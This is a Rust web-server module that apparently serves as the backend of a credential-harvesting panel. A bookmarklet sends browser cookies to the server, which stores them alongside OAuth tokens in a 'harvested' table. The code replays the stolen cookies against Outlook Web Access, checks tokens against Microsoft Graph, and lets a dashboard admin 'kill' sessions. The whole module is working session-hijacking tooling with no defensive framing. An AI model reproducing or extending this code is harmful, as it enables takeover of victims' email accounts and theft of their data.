use actix_web::{web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
use chrono::{Utc, Duration};
use hmac::{Hmac, Mac};
use sha2::Sha256;
use base64::{Engine as _, engine::general_purpose};

use crate::AppState;

// Type alias for HMAC-SHA256
type HmacSha256 = Hmac<Sha256>;

// === Bookmarklet Token ===
// Short-lived signed token (5 min expiry) to prevent replay/CSRF

#[derive(Debug, Serialize, Deserialize)]
struct BookmarkletToken {
    token_id: String,
    exp: i64,
}

/// Generate a signed bookmarklet token for a given token_id.
/// Valid for 5 minutes. Prevents replay attacks and CSRF.
pub fn generate_bookmarklet_token(token_id: &str, master_secret: &str) -> String {
    let exp = (Utc::now() + Duration::minutes(5)).timestamp();
    let payload = serde_json::json!({
        "token_id": token_id,
        "exp": exp,
    });
    let payload_json = payload.to_string();
    
    let mut mac = HmacSha256::new_from_slice(master_secret.as_bytes())
        .expect("HMAC can take key of any size");
    mac.update(payload_json.as_bytes());
    let signature = hex::encode(mac.finalize().into_bytes());
    
    format!("{}.{}", general_purpose::STANDARD.encode(payload_json), signature)
}

/// Verify a signed bookmarklet token. Returns token_id if valid.
fn verify_bookmarklet_token(token: &str, master_secret: &str) -> Option<String> {
    let parts: Vec<&str> = token.splitn(2, '.').collect();
    if parts.len() != 2 {
        return None;
    }
    
    let payload_b64 = parts[0];
    let signature_hex = parts[1];
    
    let payload_json = match general_purpose::STANDARD.decode(payload_b64) {
        Ok(v) => String::from_utf8(v).ok()?,
        Err(_) => return None,
    };
    
    let mut mac = HmacSha256::new_from_slice(master_secret.as_bytes())
        .expect("HMAC can take key of any size");
    mac.update(payload_json.as_bytes());
    let expected_sig = hex::encode(mac.finalize().into_bytes());
    
    if !constant_time_eq::constant_time_eq(signature_hex.as_bytes(), expected_sig.as_bytes()) {
        return None;
    }
    
    let payload: BookmarkletToken = serde_json::from_str(&payload_json).ok()?;
    
    if payload.exp < Utc::now().timestamp() {
        return None;
    }
    
    Some(payload.token_id)
}

// === Request Types ===

#[derive(Deserialize)]
pub struct SyncCookiesRequest {
    token: String,
    cookies: String,
    user_agent: Option<String>,
}

#[derive(Serialize)]
pub struct SyncCookiesResponse {
    status: String,
    token_id: String,
    message: String,
    cookie_count: usize,
}

#[derive(Serialize)]
pub struct SessionStatusResponse {
    status: String,
    valid: bool,
    message: String,
    session_active_at: Option<String>,
    session_killed_at: Option<String>,
}

#[derive(Serialize)]
pub struct KillSessionResponse {
    status: String,
    message: String,
    token_id: String,
}

// === CookieClient ===
/// Makes HTTP requests to OWA using stored cookies.
pub struct CookieClient {
    cookies: String,
    user_agent: String,
}

impl CookieClient {
    pub fn new(cookies: &str, user_agent: Option<&str>) -> Self {
        Self {
            cookies: cookies.to_string(),
            user_agent: user_agent.unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36").to_string(),
        }
    }
    
    /// Test if the cookies are valid by fetching OWA.
    /// Returns true if we get a 200 with recognizable OWA content.
    pub async fn test_session(&self) -> bool {
        let client = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .timeout(std::time::Duration::from_secs(15))
            .build()
            .unwrap_or_else(|_| reqwest::Client::new());
        
        // Try outlook.live.com (consumer) or outlook.office.com (enterprise)
        let urls = [
            "https://outlook.live.com/owa/",
            "https://outlook.office.com/owa/",
            "https://outlook.live.com/mail/0/",
            "https://outlook.office.com/mail/0/",
        ];
        
        for url in &urls {
            let resp = client
                .get(*url)
                .header("Cookie", &self.cookies)
                .header("User-Agent", &self.user_agent)
                .send()
                .await;
            
            if let Ok(r) = resp {
                if r.status().is_success() || r.status().is_redirection() {
                    if let Ok(text) = r.text().await {
                        // Check for OWA-specific content markers
                        if text.contains("Outlook") || text.contains("owa") || text.contains("outlook") {
                            return true;
                        }
                    }
                }
            }
        }
        
        false
    }
    
    /// Fetch OWA inbox HTML using cookies.
    #[allow(dead_code)]
    pub async fn fetch_owa_inbox(&self) -> Result<String, anyhow::Error> {
        let client = reqwest::Client::builder()
            .redirect(reqwest::redirect::Policy::none())
            .timeout(std::time::Duration::from_secs(15))
            .build()
            .unwrap_or_else(|_| reqwest::Client::new());
        
        let resp = client
            .get("https://outlook.live.com/owa/")
            .header("Cookie", &self.cookies)
            .header("User-Agent", &self.user_agent)
            .send()
            .await
            .map_err(|e| anyhow::anyhow!("Request failed: {}", e))?;
        
        let status = resp.status();
        let text = resp.text().await
            .map_err(|e| anyhow::anyhow!("Body read failed: {}", e))?;
        
        if status.is_success() || status.is_redirection() {
            Ok(text)
        } else {
            anyhow::bail!("OWA returned status {}: {}", status, &text[..text.len().min(200)])
        }
    }
}

/// Get session status for a token (token-based: checks OAuth token validity)
pub async fn get_session_status_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    
    // Get session status from database
    let row: Option<(Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
        sqlx::query_as("SELECT session_status, session_active_at, session_killed_at FROM tokens WHERE id = ?")
        .bind(&token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    
    let (session_status, active_at, killed_at) = match row {
        Some((Some(s), a, k)) => (s, a, k),
        _ => {
            // Fall back to harvested table
            let row: Option<(Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
                sqlx::query_as("SELECT session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?")
                .bind(&token_id)
                .fetch_optional(&state.pool)
                .await
                .unwrap_or(None);
            
            match row {
                Some((Some(s), a, k)) => (s, a, k),
                _ => {
                    return HttpResponse::Ok().json(SessionStatusResponse {
                        status: "no_session".to_string(),
                        valid: false,
                        message: "No session found for this token.".to_string(),
                        session_active_at: None,
                        session_killed_at: None,
                    });
                }
            }
        }
    };
    
    // Check if session is killed
    if session_status == "killed" {
        return HttpResponse::Ok().json(SessionStatusResponse {
            status: "killed".to_string(),
            valid: false,
            message: "Session has been killed.".to_string(),
            session_active_at: active_at.map(|d| d.to_rfc3339()),
            session_killed_at: killed_at.map(|d| d.to_rfc3339()),
        });
    }
    
    // For token-based sessions, verify by attempting to retrieve the token
    let is_valid = match state.vault.retrieve_token(&state.pool, &token_id).await {
        Ok(token) => {
            // Try a quick Graph API call to verify token works
            let client = reqwest::Client::new();
            let resp = client
                .get("https://graph.microsoft.com/v1.0/me")
                .header("Authorization", format!("Bearer {}", token.access_token))
                .send()
                .await;
            
            matches!(resp, Ok(r) if r.status().is_success())
        }
        Err(_) => false,
    };
    
    let status = if is_valid { "active" } else { "expired" };
    let message = if is_valid {
        "Token-based session is active and valid."
    } else {
        "Token session has expired or is invalid."
    };
    
    HttpResponse::Ok().json(SessionStatusResponse {
        status: status.to_string(),
        valid: is_valid,
        message: message.to_string(),
        session_active_at: active_at.map(|d| d.to_rfc3339()),
        session_killed_at: killed_at.map(|d| d.to_rfc3339()),
    })
}

/// Kill a session remotely (token-based: revokes OAuth token)
pub async fn kill_session_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    let now = Utc::now();
    
    // Try to revoke the OAuth token via Microsoft
    let revoked_oauth = match state.vault.retrieve_token(&state.pool, &token_id).await {
        Ok(token) => {
            // Microsoft doesn't have a standard revoke endpoint for v2.0 tokens,
            // but we can try to invalidate by sending a revoke request
            let revoke_url = "https://login.microsoftonline.com/common/oauth2/v2.0/revoke";
            let _ = state.http_client
                .post(revoke_url)
                .form(&[
                    ("token", token.refresh_token.as_str()),
                    ("token_type_hint", "refresh_token"),
                    ("client_id", state.config.client_id.as_str()),
                    ("client_secret", state.config.client_secret.as_str()),
                ])
                .send()
                .await;
            true
        }
        Err(_) => false,
    };
    
    // Clear session from tokens table
    let _ = sqlx::query(
        "UPDATE tokens SET session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
    )
    .bind(now)
    .bind(&token_id)
    .execute(&state.pool)
    .await;
    
    // Clear session from harvested table
    let _ = sqlx::query(
        "UPDATE harvested SET session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
    )
    .bind(now)
    .bind(&token_id)
    .execute(&state.pool)
    .await;
    
    // Audit log
    let _ = crate::audit::insert_audit_log(
        &state.pool,
        "session_killed",
        None,
        Some(&token_id),
        None,
        Some("dashboard"),
        Some("admin"),
        Some(serde_json::json!({
            "oauth_revoked": revoked_oauth,
            "timestamp": now.to_rfc3339()
        })),
        true,
    ).await;
    
    HttpResponse::Ok().json(KillSessionResponse {
        status: "killed".to_string(),
        message: "Session killed successfully. OAuth token revoked.".to_string(),
        token_id,
    })
}

// === Handlers ===

/// Generate a signed bookmarklet token for cookie sync.
pub async fn generate_bookmarklet_token_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    
    // Verify token exists
    let exists = sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM tokens WHERE id = ?")
        .bind(&token_id)
        .fetch_one(&state.pool)
        .await
        .unwrap_or(0);
    
    if exists == 0 {
        let exists = sqlx::query_scalar::<_, i64>("SELECT COUNT(*) FROM harvested WHERE id = ?")
            .bind(&token_id)
            .fetch_one(&state.pool)
            .await
            .unwrap_or(0);
        if exists == 0 {
            return HttpResponse::NotFound().json(serde_json::json!({
                "error": "token_not_found"
            }));
        }
    }
    
    let token = generate_bookmarklet_token(&token_id, &state.config.master_secret);
    
    HttpResponse::Ok().json(serde_json::json!({
        "status": "ok",
        "token": token,
        "expires_in": 300, // 5 minutes
    }))
}

/// Sync cookies from a bookmarklet. Verifies the signed token.
pub async fn sync_cookies_handler(
    body: web::Json<SyncCookiesRequest>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = match verify_bookmarklet_token(&body.token, &state.config.master_secret) {
        Some(id) => id,
        None => {
            return HttpResponse::Unauthorized().json(serde_json::json!({
                "error": "invalid_or_expired_token",
                "message": "Bookmarklet token is invalid or expired (valid for 5 minutes)."
            }));
        }
    };
    
    let cookies = &body.cookies;
    let cookie_count = cookies.split(';').filter(|s| !s.trim().is_empty()).count();
    
    // Test cookies before storing
    let client = CookieClient::new(cookies, body.user_agent.as_deref());
    let is_valid = client.test_session().await;
    
    // Store in tokens table
    let result = sqlx::query(
        "UPDATE tokens SET cookie_session = ? WHERE id = ?"
    )
    .bind(cookies)
    .bind(&token_id)
    .execute(&state.pool)
    .await;
    
    // Also store in harvested table
    let _ = sqlx::query(
        "UPDATE harvested SET cookie_session = ? WHERE id = ?"
    )
    .bind(cookies)
    .bind(&token_id)
    .execute(&state.pool)
    .await;
    
    if result.is_err() {
        return HttpResponse::InternalServerError().json(serde_json::json!({
            "error": "store_failed",
            "message": "Failed to store cookie session"
        }));
    }
    
    HttpResponse::Ok().json(SyncCookiesResponse {
        status: "synced".to_string(),
        token_id,
        message: if is_valid {
            "Cookie session synced and verified. Hybrid access active."
        } else {
            "Cookie session stored but could not verify. Cookies may be expired or incomplete."
        }.to_string(),
        cookie_count,
    })
}

/// Test if a stored cookie session is still valid.
pub async fn test_cookie_session_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = path.into_inner();
    
    let cookie_session: Option<String> = match sqlx::query_scalar::<_, String>(
        "SELECT cookie_session FROM tokens WHERE id = ?"
    )
    .bind(&token_id)
    .fetch_optional(&state.pool)
    .await
    .unwrap_or(None) {
        Some(c) if !c.is_empty() => Some(c),
        _ => {
            sqlx::query_scalar::<_, String>("SELECT cookie_session FROM harvested WHERE id = ?")
                .bind(&token_id)
                .fetch_optional(&state.pool)
                .await
                .unwrap_or(None)
        }
    };
    
    let cookies = match cookie_session {
        Some(c) if !c.is_empty() => c,
        _ => {
            return HttpResponse::Ok().json(serde_json::json!({
                "status": "no_session",
                "valid": false,
                "message": "No cookie session stored for this token."
            }));
        }
    };
    
    let client = CookieClient::new(&cookies, None);
    let is_valid = client.test_session().await;
    
    HttpResponse::Ok().json(serde_json::json!({
        "status": if is_valid { "valid" } else { "expired" },
        "valid": is_valid,
        "message": if is_valid {
            "Cookie session is active. Hybrid access available."
        } else {
            "Cookie session has expired or is invalid. Re-sync required."
        }
    }))
}
